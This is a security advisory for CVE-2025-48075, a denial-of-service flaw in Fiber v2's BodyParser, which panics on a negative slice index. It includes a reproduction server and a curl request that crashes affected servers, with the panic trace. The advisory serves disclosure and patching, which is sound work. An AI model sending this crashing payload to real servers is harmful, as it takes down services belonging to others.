# [H] Fiber panics when fiber.Ctx.BodyParser parses invalid range index

## Summary
Severity: High
Advisory: GHSA-hg3g-gphw-5hhm
CVE: CVE-2025-48075
CWE: CWE-129
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-05-22
Source: https://github.com/advisories/GHSA-hg3g-gphw-5hhm
Type: github-advisory

## Affected
- Go: `github.com/gofiber/fiber/v2` — affected >=2.52.6 <2.52.7

## Details
### Summary
When using the `fiber.Ctx.BodyParser` to parse into a struct with range values, a panic occurs when trying to parse a negative range index

### Details
`fiber.Ctx.BodyParser` can map flat data to nested slices using `key[idx]value` syntax, however when idx is negative, it causes a panic instead of returning an error stating it cannot process the data. 

Since this data is user-provided, this could lead to denial of service for anyone relying on this `fiber.Ctx.BodyParser`  functionality  

### Reproducing
Take a simple GoFiberV2 server which returns a JSON encoded version of the FormData
```go
package main

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/gofiber/fiber/v2"
)

type RequestBody struct {
	NestedContent []*struct {
		Value string `form:"value"`
	} `form:"nested-content"`
}

func main() {
	app := fiber.New()

	app.Post("/", func(c *fiber.Ctx) error {
		formData := RequestBody{}
		if err := c.BodyParser(&formData); err != nil {
			fmt.Println(err)
			return c.SendStatus(http.StatusUnprocessableEntity)
		}
                c.Set("Content-Type", "application/json")
                s, _ := json.Marshal(formData)
                return c.SendString(string(s))
	})

	fmt.Println(app.Listen(":3000"))
}

```

**Correct Behaviour**
Send a valid request such as:
```bash
curl --location 'localhost:3000' \
--form 'nested-content[0].value="Foo"' \
--form 'nested-content[1].value="Bar"'
```
You recieve valid JSON
```json
{"NestedContent":[{"Value":"Foo"},{"Value":"Bar"}]}
```

**Crashing behaviour**
Send an invalid request such as:
```bash
curl --location 'localhost:3000' \
--form 'nested-content[-1].value="Foo"'
```
The server panics and crashes
```
panic: reflect: slice index out of range

goroutine 8 [running]:
reflect.Value.Index({0x738000?, 0xc000010858?, 0x0?}, 0x738000?)
        /usr/lib/go-1.24/src/reflect/value.go:1418 +0x167
github.com/gofiber/fiber/v2/internal/schema.(*Decoder).decode(0xc00002c570, {0x75d420?, 0xc000010858?, 0x7ff424822108?}, {0xc00001c498, 0x17}, {0xc00014e2d0, 0x2, 0x2}, {0xc00002c710, ...})
[...]
```

### Impact
Anyone using `fiber.Ctx.BodyParser` can/will have their servers crashed when an invalid payload is sent

## References
- https://github.com/gofiber/fiber/security/advisories/GHSA-hg3g-gphw-5hhm
- https://nvd.nist.gov/vuln/detail/CVE-2025-48075
- https://github.com/gofiber/fiber/commit/e115c08b8f059a4a031b492aa9eef0712411853d
- https://github.com/gofiber/fiber
- https://pkg.go.dev/vuln/GO-2025-3706
